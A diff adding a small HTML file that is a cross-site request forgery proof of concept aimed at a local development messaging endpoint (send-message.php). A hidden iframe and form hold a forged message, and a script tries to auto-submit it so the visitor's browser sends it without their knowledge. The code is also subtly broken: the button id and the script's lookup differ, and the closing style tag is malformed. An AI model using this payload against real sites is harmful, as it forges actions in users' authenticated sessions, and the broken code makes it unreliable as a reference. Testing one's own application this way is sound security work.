@@ -1,0 +1,13 @@
+<style media="screen">
+    #csrf{
+      display: none;
+    }
+<style>
+<iframe style="display:none" name="csrf-farme"></iframe>
+<form action="http://localhost/devers/sn/send-message.php?receiver=3" target="">
+  <textarea name="body" rows="8" cols="80">CSRF MESSAGE</textarea>
+  <input type="submit" name="send" id="sumbit" value="Send Message">
+</form>
+<script type="text/javascript">
+  document.getElementById("submit").click();
+</script>
